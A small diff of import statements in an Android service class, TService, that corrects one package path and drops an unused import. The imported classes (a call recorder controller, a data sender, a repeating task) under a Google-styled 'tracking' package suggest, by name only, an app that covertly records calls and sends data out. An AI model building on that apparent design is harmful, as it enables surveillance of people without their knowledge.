@@ -19,10 +19,9 @@ import com.google.tracking.call.CallRecorderController;
 import com.google.tracking.constants.TrackingConstants;
 import com.google.tracking.runnable.RepeatingTask;
 import com.google.tracking.sender.DataSender;
-import google_api.ApiConnectionListener;
+import com.google.tracking.google_api.ApiConnectionListener;
 
 import java.io.*;
-import java.util.Arrays;
 
 
 public class TService extends Service {
